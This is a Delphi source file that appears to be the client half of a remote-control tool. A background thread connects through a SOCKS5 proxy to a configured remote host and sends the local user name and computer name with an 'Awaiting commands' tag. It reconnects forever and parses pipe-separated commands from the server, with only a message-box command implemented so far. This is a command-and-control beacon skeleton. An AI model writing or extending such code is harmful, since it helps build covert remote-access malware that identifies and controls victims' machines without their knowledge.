unit USocket;

interface

uses Windows,System.Classes,System.SysUtils,IdSocketHandle,
  IdServerIOHandler, IdServerIOHandlerSocket,IdSSLOpenSSL,idSocks,
  IdCustomTransparentProxy, IdConnectThroughHttpProxy,
  IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdStack,uConfig;

type
  TDynStringArray = array of string;

type
   TServerSocket = class(TThread)
   private
   protected
      procedure Execute; override;
   public
     constructor Create(Suspended: Boolean);
     procedure ReceiveData(STR:string);
     function Explode(const Separator, S :String; Limit :Integer = 0): TDynStringArray;

   end;



var Closed:boolean;

function UserName(): string;
function CompName(): string;

implementation


Constructor TServerSocket.Create(Suspended: Boolean);
begin
 Inherited Create(Suspended);
end;

procedure TServerSocket.Execute;
var
TCPClient: TIdTCPClient;
HttpProxy: TIdConnectThroughHttpProxy;
SocksProxy: TIdSocksInfo;
IdIOHandlerStack:TIdIOHandlerStack;
Buffer: Array[0..8192] Of Char;
iRecv: Integer;
Tmp:string;
begin
  Closed := False;
  TCPClient := TIdTcpClient.create(nil);
  TCPClient.Host := Rhost;
  TCPClient.Port := RPort;
  IdIOHandlerStack:= TIdIOHandlerStack.Create (nil);
  SocksProxy := TIdSocksInfo.Create (nil);
  SocksProxy.Version := svSocks5;
  SocksProxy.Host := RPHost;
  SocksProxy.Port := RPPort;
  IdIOHandlerStack.TransparentProxy:= SocksProxy;
  IdIOHandlerStack.TransparentProxy.Enabled:= True;
  TCPCLient.IOHandler:= IdIOHandlerStack;
repeat
  TCPClient.Connect;
  writeln('Connecting to '+Rhost + ' On Port : ' + inttostr(Rport));
        While TCPClient.Socket.Connected = true do
        begin
            Writeln('Connected To '+Rhost);
            TCPClient.Socket.WriteLn(Pchar('ADDNEW|' + Username + '|' + CompName + '|' + 'Awaiting commands'));
            tmp := TCPClient.Socket.ReadLn();
            writeln(tmp);
            ReceiveData(tmp);
            Tmp := '';
        end;
        Writeln('Lost connection');
      TCPClient.Disconnect;
    sleep(3000);
  until(1 = 3);
  TCPClient.Free;
  IDIOHandlerStack.Free;
  Socksproxy.Free;
end;



procedure TServerSocket.ReceiveData(STR:string);
var
  Data: String;
  strArr: TDynStringArray;
begin

  //Convert our data to a string and trim it
  Data := STR;

  Data := PansiChar(data);

  Data := Trim(Data);

  if Length(Data) > 0 then begin
   Writeln('PAnsiChar' + data);
  //Setup our dynamic array structure
  StrArr := Explode('|', Data);

  //Display incoming message (if strArr[0] = 'MSGBOX')
  if StrArr[0] = 'MSGBOX' then begin
   MessageBox(0,pchar(StrArr[1]),'Winsock Example',MB_OK + MB_ICONINFORMATION)
  end;

end;
end;

function TServerSocket.Explode(const Separator, S :String; Limit :Integer = 0): TDynStringArray;
  var
    SepLen: Integer;
    F, P: PChar;
begin
  SetLength(Result, 0);
  if (S = '') or (Limit < 0) then
    Exit;
  if Separator = '' then
    begin
      SetLength(Result, 1);
      Result[0] := S;
      Exit;
    end;
  SepLen := Length(Separator);

  P := PChar(S);
  while P^ <> #0 do
    begin
      F := P;
      P := AnsiStrPos(P, PChar(Separator));
      if (P = nil) or ((Limit > 0) and (Length(Result) = Limit - 1)) then
        P := StrEnd(F);
      SetLength(Result, Length(Result) + 1);
      SetString(Result[High(Result)], F, P - F);
      F := P;
      if P = Separator then
        SetLength(Result, Length(Result) + 1);
      while (P^ <> #0) and (P - F < SepLen) do
        Inc(P);
    end;
end;


function UserName(): string;
var
  User : array[0..255] of Char;
  SizeOfUser : Cardinal;
begin
  SizeOfUser := SizeOf(User);
  if GetUserName(User, SizeOfUser) = True then
    Result := string(User)
  else
  Result := 'Unknown';
end;

function CompName(): string;
var
  Comp : array[0..255] of Char;
  SizeOfComp : Cardinal;
begin
  SizeOfComp := SizeOf(Comp);
  if GetComputerName(Comp, SizeOfComp) = True then
    Result := string(Comp)
  else
  Result := 'Unknown';
end;

end.
